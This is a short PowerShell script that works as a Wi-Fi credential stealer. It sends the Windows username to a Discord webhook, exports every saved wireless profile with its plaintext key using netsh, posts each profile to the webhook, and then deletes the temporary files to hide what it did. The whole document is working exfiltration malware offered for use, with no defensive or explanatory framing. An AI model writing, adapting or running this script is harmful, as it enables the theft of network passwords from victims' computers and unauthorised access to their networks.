# Paste ur discord webhook below
$webhookUri = 'Discord webhook'
$name = (Get-ChildItem Env:USERNAME).Value
$number = 1
$body = @{
	content  = 'Computer name : ' + '```' + $name + '```'
	}
Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $body
New-Item -Path $env:temp -Name "476F6F6420426F7921" -ItemType "directory"
Set-Location -Path "$env:temp/476F6F6420426F7921"
netsh wlan export profile key=clear;
Set-Location -Path $env:temp
Get-ChildItem "$env:tmp/476F6F6420426F7921" -File | 
ForEach-Object { 
$string = Get-Content $_.FullName | Out-String
$body = @{
	content  = 'WIFI ' + $number + ' : ' + '```' + $string + '```'
	}
	Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $body
	Start-Sleep -Milliseconds 300
	$number += 1
}
Remove-Item -Path "$env:tmp/476F6F6420426F7921" -Force -Recurse
exit